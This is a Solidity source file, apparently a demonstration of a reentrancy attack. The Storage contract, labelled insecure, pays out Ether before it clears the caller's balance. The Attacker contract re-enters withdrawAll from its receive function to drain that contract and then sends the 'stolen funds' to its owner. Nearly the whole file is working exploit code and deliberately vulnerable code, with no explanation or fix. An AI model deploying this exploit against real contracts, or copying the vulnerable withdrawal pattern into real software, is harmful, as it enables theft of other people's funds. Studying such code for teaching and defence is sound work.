// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

//INSECURE!!!
contract Storage {
    mapping(address => uint256) public userBalances;

    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
    }

    function withdrawAll() external {
        uint256 balance = userBalances[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        userBalances[msg.sender] = 0;
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    Storage public target;
    address public owner;

    constructor(address _target) {
        target = Storage(_target);
        owner = msg.sender;
    }

    // The receive function will be called repeatedly during the reentrancy attack
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdrawAll(); // Reenter the vulnerable contract
        }
    }

    // Attack function to start the reentrancy attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 Ether to attack");

        // First, deposit some Ether into the vulnerable contract
        target.deposit{value: 1 ether}();

        // Then, call withdrawAll to trigger the receive function and reentrancy
        target.withdrawAll();
    }

    // Withdraw stolen funds to the attacker's wallet
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    // Get contract balance for tracking purposes
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}